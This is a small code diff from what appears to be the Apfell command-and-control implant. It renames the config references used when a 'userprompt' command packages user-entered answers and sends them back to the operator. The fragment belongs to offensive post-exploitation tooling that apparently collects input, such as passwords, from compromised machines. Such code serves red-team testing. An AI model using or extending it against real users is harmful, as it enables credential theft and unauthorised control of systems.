@@ -9,7 +9,7 @@ userprompt = function(params) {
     }
 
     const promptdata = btoa(unescape(encodeURIComponent((JSON.stringify(ans)))));
-    const apfellMsg = CreateApfellMessage(2, config.apfellID, config.UUID, data.length, taskid, tasktype, promptdata);
+    const apfellMsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, promptdata);
     let meta = {};
     meta["metatype"] = 3;
     meta["metadata"] = apfellMsg;
@@ -18,4 +18,4 @@ userprompt = function(params) {
 };
 
 C2.commands[userprompt.name] = userprompt;
-
+COMMAND_ENDS_HERE
